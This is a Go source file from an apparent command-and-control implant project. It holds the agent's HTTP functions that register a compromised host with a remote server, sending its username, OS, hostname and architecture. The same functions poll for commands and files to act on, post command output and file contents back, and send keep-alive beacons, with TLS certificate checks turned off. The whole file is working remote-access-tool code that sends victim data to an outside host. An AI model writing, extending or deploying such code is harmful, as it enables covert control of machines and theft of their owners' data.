package requests

import (
	"MoP/src/config"
	"MoP/src/models"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"io"
	"net/http"
	"strconv"
)

var (
	conf = config.Load()
	tr   = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client = &http.Client{Transport: tr}
)

func Presentation(agent models.NewAgent) {

	url := conf.Hostname + "/agents"

	body, _ := json.Marshal(map[string]string{
		"name":     agent.Name,
		"username": agent.Username,
		"os":       agent.OS,
		"hostname": agent.Hostname,
		"arch":     agent.Arch,
	})
	payload := bytes.NewBuffer(body)

	resp, err := client.Post(url, "application/json", payload)
	if err != nil {
		return
	}
	defer resp.Body.Close()

}

func GetFile(agent models.NewAgent) []models.File {

	url := conf.Hostname + "/agents/" + agent.Name + "/fl"
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	var files []models.File
	err = json.Unmarshal(respBody, &files)
	if err != nil {
		return nil
	}

	return files
}

func DeleteFile(agent models.NewAgent, fileID int) {

	url := conf.Hostname + "/agents/" + agent.Name + "/fl/" + strconv.Itoa(fileID)
	req, _ := http.NewRequest(http.MethodDelete, url, nil)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func GetCommand(agent models.NewAgent) []models.Command {

	url := conf.Hostname + "/agents/" + agent.Name + "/com"
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	var comm []models.Command
	err = json.Unmarshal(respBody, &comm)
	if err != nil {
		return nil
	}

	return comm
}

func AliveRequest(agentName string) {

	url := conf.Hostname + "/agents/" + agentName + "/alive"
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func PostCommand(agentID int, command string, resp string, agent models.NewAgent) {

	url := conf.Hostname + "/agents/" + agent.Name + "/com"

	body := &models.PostCommandMessage{
		ID:      agentID,
		Command: command,
		Resp:    resp,
	}
	payload := new(bytes.Buffer)
	json.NewEncoder(payload).Encode(body)

	response, err := client.Post(url, "application/json", payload)
	if err != nil {
		return
	}
	defer response.Body.Close()

}

func PostFile(agent models.NewAgent, file models.File) {
	url := conf.Hostname + "/agents/" + agent.Name + "/fl"

	body := &models.File{
		ID:        file.ID,
		Filename:  file.Filename,
		File:      file.File,
		Direction: file.Direction,
	}
	payload := new(bytes.Buffer)
	json.NewEncoder(payload).Encode(body)

	response, err := client.Post(url, "application/json", payload)
	if err != nil {
		return
	}
	defer response.Body.Close()
}
